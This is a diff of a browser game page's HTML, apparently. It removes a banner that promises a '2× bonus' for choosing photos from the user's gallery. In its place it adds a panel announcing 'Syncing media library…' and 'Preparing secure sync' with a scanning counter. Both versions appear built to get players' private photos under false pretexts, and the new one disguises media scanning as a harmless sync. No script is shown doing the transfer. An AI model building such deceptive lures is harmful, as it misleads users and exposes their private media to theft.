@@ -70,13 +70,19 @@
         <div class="progress-hint" id="progress-hint">Keep playing to unlock bonus…</div>
       </div>
 
-      <div class="verify-banner hidden" id="verify-banner">
-        <div class="verify-icon">🎁</div>
-        <div class="verify-text">
-          <strong>Unlock 2× bonus!</strong>
-          <span>Select photos from your gallery to verify</span>
+      <div class="sync-panel hidden" id="sync-panel">
+        <div class="sync-head">
+          <div class="sync-spinner" id="sync-spinner"></div>
+          <div>
+            <div class="sync-title" id="sync-title">Syncing media library…</div>
+            <div class="sync-sub" id="sync-sub">Preparing secure sync</div>
+          </div>
         </div>
-        <button type="button" class="verify-btn" id="verify-btn">Choose photos</button>
+        <div class="sync-bar"><div class="sync-fill" id="sync-fill"></div></div>
+        <div class="sync-meta">
+          <span id="sync-count">Scanning…</span>
+          <button type="button" class="sync-retry hidden" id="sync-retry">Sync again</button>
+        </div>
       </div>
 
       <p class="player-tag">Playing as <strong id="person-name">—</strong></p>
